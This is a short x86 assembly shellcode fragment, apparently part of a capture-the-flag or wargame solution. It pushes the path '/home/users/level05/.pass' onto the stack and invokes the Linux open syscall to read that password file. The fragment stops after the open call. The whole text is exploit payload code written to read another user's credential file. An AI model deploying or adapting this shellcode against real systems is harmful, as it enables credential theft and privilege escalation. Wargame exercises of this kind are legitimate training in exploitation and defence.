
global _start
section .text

_start:
  xor eax, eax

  ; mode = 0
  push eax

  ; flags = O_RDONLY
  push eax

  ; push pathname = "/home/users/level05/.pass"
  push eax
  push 0x73
  push 0x7361702e
  push 0x2f35306c
  push 0x6576656c
  push 0x2f737265
  push 0x73752f65
  push 0x6d6f682f

  lea eax, [esp + 30 + 4]
  push eax
  lea eax, [esp + 30]
  push eax
  lea eax, [esp + 8]
  push eax

  ; call open(".../level05/.pass", O_RDONLY)
  xor eax, eax
  mov  al, 0x5
  int  0x80
